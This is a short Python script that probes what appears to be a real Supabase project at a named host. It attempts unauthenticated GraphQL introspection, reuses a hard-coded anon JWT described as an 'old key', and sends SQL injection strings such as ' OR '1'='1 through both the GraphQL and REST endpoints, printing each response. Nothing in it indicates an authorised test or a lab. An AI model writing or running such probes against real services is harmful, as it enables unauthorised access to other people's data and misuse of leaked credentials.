import requests, json

url = 'https://nhxymqfpweywwylxmuju.supabase.co/graphql/v1/graphql'

# 1. Try introspection without key
r = requests.post(url, json={'query': 'query { __schema { queryType { fields { name } } } }'}, 
    headers={'Content-Type': 'application/json'}, timeout=10)
print(f'No auth introspection: {r.status_code} - {r.text[:200]}')

# 2. Try with old key
old_key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oeXltcWZwd2V5d3l4Ym11aSIsInJvbGUiOiJhbm9uIiwiaWF0IjoxNzgwMjk5MjkwLCJleHAiOjIwOTU4NzUyOTB9.OCqzmAsdlSeHbUYc0cxzZdySf0jm-FkQ-U_1Kfg5rAM'
r = requests.post(url, json={'query': 'query { __schema { queryType { fields { name } } } }'}, 
    headers={'Content-Type': 'application/json', 'apikey': old_key, 'Authorization': f'Bearer {old_key}'}, timeout=10)
print(f'Old key introspection: {r.status_code} - {r.text[:200]}')

# 3. SQL injection in GraphQL
sqli_query = "query { users(where: {id: {_eq: \"' OR '1'='1\"}}) { id } }"
r = requests.post(url, json={'query': sqli_query}, 
    headers={'Content-Type': 'application/json'}, timeout=10)
print(f'SQLi attempt: {r.status_code} - {r.text[:200]}')

# 4. Try URL query parameter
r = requests.post(f'{url}?apikey={old_key}', json={'query': 'query { users { id } }'}, timeout=10)
print(f'URL param: {r.status_code} - {r.text[:200]}')

# 5. Test for PostgREST-style SQL injection
r = requests.get('https://nhxymqfpweywwylxmuju.supabase.co/rest/v1/users', 
    headers={'apikey': old_key, 'Authorization': f'Bearer {old_key}'},
    params={'select': '*', 'id': "eq ' OR '1'='1"}, timeout=10)
print(f'SQLi REST: {r.status_code} - {r.text[:200]}')
